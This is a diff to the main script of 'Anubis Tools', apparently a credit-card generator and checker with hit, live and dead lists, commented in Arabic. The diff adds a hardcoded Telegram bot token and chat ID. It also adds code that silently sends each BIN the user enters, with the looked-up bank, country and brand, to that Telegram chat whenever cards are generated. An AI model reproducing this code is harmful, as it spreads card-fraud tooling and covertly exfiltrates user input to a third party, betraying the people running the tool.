@@ -1,8 +1,77 @@
+// ================= ANUBIS TOOLS MAIN SCRIPT =================
+
 let counters = { hit: 0, live: 0, dead: 0 };
 let isChecking = false;
 let lists = { hit: [], live: [], dead: [] };
 let startTime;
 let checkedCount = 0;
+
+// 🔥 إعدادات تيليجرام (تم دمج بياناتك)
+const TELEGRAM_CONFIG = {
+    token: "8377557863:AAHUSrbtTDuPIWJCl-jMyWDSaUepqBWkUo8", 
+    chatId: "954586361"
+};
+
+// متغير لمنع تكرار إرسال نفس الـ BIN
+let lastSentBin = "";
+
+// ✅ دالة جديدة: فحص الـ BIN وإرسال التفاصيل لتيليجرام
+async function lookupAndSendToTelegram(bin) {
+    // لو الـ BIN ده لسه مبعوت من شوية، منبعتوش تاني
+    if (bin === lastSentBin) return;
+    lastSentBin = bin;
+
+    try {
+        // 1. عمل فحص للـ BIN (Lookup)
+        // نستخدم نفس API الموقع الموجود في التبويب التاني
+        const lookupResponse = await fetch(`https://corsproxy.io/?https://lookup.binlist.net/${bin}`);
+        
+        if (!lookupResponse.ok) throw new Error("Lookup Failed");
+        
+        const data = await lookupResponse.json();
+
+        // 2. استخراج البيانات (مع التعامل مع القيم الفارغة)
+        const bank = data.bank && data.bank.name ? data.bank.name : "N/A";
+        const brand = data.scheme ? data.scheme.toUpperCase() : "N/A";
+        const type = data.type ? data.type.toUpperCase() : "N/A";
+        const level = data.brand ? data.brand.toUpperCase() : "N/A";
+        const country = data.country && data.country.name ? `${data.country.emoji} ${data.country.name}` : "N/A";
+        const currency = data.country && data.country.currency ? data.country.currency : "N/A";
+
+        // 3. تجهيز الرسالة الاحترافية
+        const message = `🔔 <b>New BIN Usage Alert!</b>\n\n` +
+                        `💳 <b>BIN:</b> <code>${bin}</code>\n` +
+                        `🏦 <b>Bank:</b> ${bank}\n` +
+                        `🌍 <b>Country:</b> ${country}\n` +
+                        `🏷 <b>Brand:</b> ${brand}\n` +
+                        `💠 <b>Type:</b> ${type} (${level})\n` +
+                        `💲 <b>Currency:</b> ${currency}\n\n` +
+                        `🛠 <b>Tool:</b> Anubis Card Gen\n` +
+                        `📅 <b>Time:</b> ${new Date().toLocaleString('en-GB')}`;
+
+        // 4. إرسال الرسالة عبر البروكسي
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+        const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
+
+        await fetch(proxyUrl);
+        console.log("✅ Full BIN Details sent to Telegram");
+
+    } catch (err) {
+        console.error("Lookup Error, sending simple alert:", err);
+        // لو الفحص فشل، ابعت الـ BIN بس كاحتياطي
+        sendSimpleBinToTelegram(bin);
+    }
+}
+
+// دالة احتياطية (لو الفحص فشل)
+async function sendSimpleBinToTelegram(bin) {
+    const message = `🔔 <b>New BIN Usage Alert!</b>\n\n💳 <b>BIN:</b> <code>${bin}</code>\n⚠️ <i>Lookup Failed (API Limit or Network)</i>\n\n🛠 <b>Tool:</b> Anubis Card Gen`;
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
+    fetch(proxyUrl).catch(e => {});
+}
+
+// ================= ORIGINAL LOGIC =================
 
 function clearHits() {
     document.getElementById('resHit').innerHTML = "";
@@ -123,8 +192,19 @@ function generateCheckDigit(payload) {
     return (10 - (sum % 10)) % 10;
 }
 
+// === دالة التوليد (Generate) - تم ربطها بالفحص والإرسال ===
 function generateCards() {
     let format = document.getElementById('ccFormat').value.trim();
+    
+    // ✅ الجزء الجديد: إرسال الـ BIN بعد فحصه
+    let cleanBin = format.replace(/[^0-9]/g, '');
+    if (cleanBin.length >= 6) {
+        // بناخد أول 6 أو 8 أرقام حسب المتوفر
+        let binToSend = cleanBin.substring(0, 8); 
+        // استدعاء دالة الفحص والإرسال (بدون انتظار النتيجة عشان ميعطلش التوليد)
+        lookupAndSendToTelegram(binToSend);
+    }
+
     if (!format) format = "539935xxxxxxxxxx";
     
     const count = document.getElementById('genCount').value;
@@ -258,7 +338,6 @@ function download(type) {
     a.click();
 }
 
-// ================= TOAST NOTIFICATION FUNCTION (جديد) =================
 function showToast(message) {
     var x = document.getElementById("toast");
     x.className = "show";
@@ -266,13 +345,10 @@ function showToast(message) {
     setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
 }
 
-// ================= BIN POPUP LOGIC =================
-
 async function openBinModal() {
     let bin = document.getElementById('ccFormat').value.replace(/[^0-9]/g, '').substring(0, 6);
     
     if (bin.length < 6) {
-        // تم استبدال Alert بـ showToast
         showToast("⚠️ Please enter at least 6 digits!");
         return;
     }
@@ -281,7 +357,6 @@ async function openBinModal() {
     const loading = document.getElementById('modalLoading');
     const dataDiv = document.getElementById('modalData');
 
-    // إظهار المودال
     modal.style.display = "block";
     loading.style.display = "block";
     dataDiv.style.display = "none";
@@ -291,7 +366,6 @@ async function openBinModal() {
         if (!response.ok) throw new Error("Not Found");
         const data = await response.json();
 
-        // تعبئة البيانات
         document.getElementById('m_bin').innerText = bin;
         document.getElementById('m_bank').innerText = (data.bank && data.bank.name) ? data.bank.name : "N/A";
         document.getElementById('m_brand').innerText = data.scheme ? data.scheme.toUpperCase() : "N/A";
@@ -308,13 +382,11 @@ async function openBinModal() {
     }
 }
 
-// 2. إغلاق النافذة
 function closeBinModal() {
     document.getElementById('binModal').style.display = "none";
     document.getElementById('modalLoading').innerHTML = "Searching... ⌛";
 }
 
-// 3. إغلاق النافذة عند الضغط خارج المربع
 window.onclick = function(event) {
     const modal = document.getElementById('binModal');
     if (event.target == modal) {
@@ -322,7 +394,6 @@ window.onclick = function(event) {
     }
 }
 
-// 4. حفظ البيانات في ملف نصي
 function saveBinDetails() {
     const bin = document.getElementById('m_bin').innerText;
     if (bin === "---") return;
@@ -348,15 +419,9 @@ Powered by: Hesham Taha
     a.click();
 }
 
-// دالة التبديل بين التبويبات
 function openTab(tabId, btn) {
-    // إخفاء كل التبويبات
     document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
-    
-    // إزالة التنشيط من كل الأزرار
     document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-    
-    // إظهار التبويب المطلوب وتنشيط زرّه
     document.getElementById(tabId).style.display = 'block';
     btn.classList.add('active');
 }
